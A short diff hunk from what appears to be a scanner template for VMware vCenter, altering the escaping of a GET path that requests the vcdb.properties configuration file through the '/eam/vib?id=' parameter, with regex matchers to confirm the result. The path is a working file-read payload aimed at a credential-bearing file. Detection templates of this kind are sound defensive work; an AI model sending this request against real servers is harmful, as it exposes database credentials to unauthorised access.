@@ -9,7 +9,7 @@ info:
 requests:
   - method: GET
     path:
-      - "{{BaseURL}}/eam/vib?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties"
+      - "{{BaseURL}}/eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties"
     matchers-condition: and
     matchers:
       - type: regex
